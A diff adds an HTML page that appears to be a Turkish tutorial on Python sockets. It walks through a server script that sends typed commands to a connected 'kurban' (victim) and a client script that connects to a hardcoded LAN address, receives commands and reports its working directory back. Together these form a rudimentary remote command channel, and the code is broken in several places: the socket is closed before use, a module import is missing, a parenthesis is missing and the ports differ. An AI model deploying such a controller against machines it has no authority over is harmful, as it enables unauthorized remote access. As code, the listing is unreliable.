@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, user-scalable=no" />
+  <title>Python Socket</title>
+  <link rel="stylesheet" type="text/css" href="/assets/main-dark.css">
+</head>
+<body>
+    <div class="container" style="max-width:100%;height:auto;">
+<header>
+  <div class="menu">
+
+
+
+
+
+
+################################
+<span style="background:#008000">Gelen veriyi işlemek server.py</span>
+################################
+
+<span style="background:#8600b3">import socket
+<span style="background:#8600b3">host=""
+<span style="background:#8600b3">port=15555
+<span style="background:#8600b3">s=socket.socket()
+</br>
+<span style="background:#8600b3">def bagla():
+<span style="background:#8600b3">    try:
+<span style="background:#8600b3">        s.bind((host,port))
+<span style="background:#8600b3">        s.listen()
+<span style="background:#8600b3">    except:
+<span style="background:#8600b3">        print("baglantı hatası")
+<span style="background:#8600b3">        bagla()
+
+        
+<span style="background:#8600b3">def kabul_et():
+<span style="background:#8600b3">    print("Baglantı bekleniyor")
+<span style="background:#8600b3">    baglanti,adres=s.accept()
+<span style="background:#8600b3">    print("Bağlantı gerçekleşti kurban ip:",adres[0],"kurban port:",adres[1])
+<span style="background:#8600b3">    komut_yolla(baglanti)
+<span style="background:#8600b3">    baglanti.close() #serverdan "quit" girersen while döngüsü break olacak ve bu satıra gelecek,daha sonra baglanti kapanacak
+    
+#serverdan cliente veri(komut) yollamak için sonsuz döngülü bi blok yaratalım
+<span style="background:#8600b3">def komut_yolla(baglanti):
+<span style="background:#8600b3">    while True:
+<span style="background:#8600b3">        cmd=input("What is your code")
+<span style="background:#8600b3">        if cmd=="quit":  # eğer quit girmişsem döngüyü sonlandır
+<span style="background:#8600b3">            break #eğer serverdan "quit" girersen komut_yolla() fonksiyonundan çıkması için break kullanıldı
+
+<span style="background:#8600b3">        if len(cmd)>0:
+            #serverdan girdiğim veriyi cliente yollayacağım
+            #cmd girdisini stringden alıp byte a dönüştürmem gerekiyor
+            #yani biz soket üzerinde veri alıp yollarken bunu bytelar üzerinden yapıyoruz
+            #serverdan cliente veriyi yollarken "baglati" değişkeni üzerinden yollarız
+            #Cünkü "baglanti" benim client ile ilişkimi temsil ediyor
+<span style="background:#8600b3">            baglanti.send(cmd.encode("utf-8"))
+<span style="background:#8600b3">            cevap=baglanti.recv(4096).decode("utf-8")
+<span style="background:#8600b3">            print(cevap)
+<span style="background:#8600b3">bagla()
+<span style="background:#8600b3">kabul_et()
+
+
+
+##########################################################################################################################################################
+##########################################################################################################################################################
+##########################################################################################################################################################
+##########################################################################################################################################################
+##########################################################################################################################################################
+##########################################################################################################################################################
+
+
+
+
+
+
+
+
+
+
+################################
+#Gelen veriyi işlemek client.py#
+################################
+
+<span style="background:#8600b3">import socket
+<span style="background:#8600b3">s=socket.socket()
+<span style="background:#8600b3">s.connect(("192.168.1.31",20000))
+<span style="background:#8600b3">s.close()
+#Ben  buraya sonsuz bir döngü açıyorum ve karşı taraftan sürekli veri bekliyorum
+#1024 olarak buffersizeımı açtım,1024 tek seferde okuyabileceğim byte sayısı
+<span style="background:#8600b3">while True:
+<span style="background:#8600b3">    veri=s.recv(1024)
+<span style="background:#8600b3">    if veri[:2].decode("utf-8")=="cd":
+        #eğer gelen verinin ilk 2 karakteri cd ise        
+<span style="background:#8600b3">        try:
+            #bu cd durumunu kontrol etmek için try blogu açtım
+<span style="background:#8600b3">            os.chdir(veri[3:].decode("utf-8"))
+            #chdir fonksiyonuna gitmek istediğin dizini ver
+            #3.karakterden itibaren al ve stringe çevir
+
+            #dizin değiştiği zaman o an ki dizini servera yolla
+<span style="background:#8600b3">            s.send(os.getcwd().encode("utf-8")
+            #getcwd() fonksiyonu string döner onu encode("utf-8") ile byte dönüştürüp servera yollayalım
+                        
+<span style="background:#8600b3">        except FileNotFoundError:
+            #Böyle bir hata alırsak servera şu mesajı ilet
+<span style="background:#8600b3">            s.send("Dosya bulunamadı...".encode("utf-8"))
+
+
+
+
+
+
+
+
+
+
+</br></br>
+<p style="color:MediumSeaGreen;">Kaynak kod:<a href="https://github.com/nuriyavuz/PythonSocketTest">https://github.com/nuriyavuz/PythonSocketTest</a></p>
+
+</br>
+</br>
+  </div>
+</header>
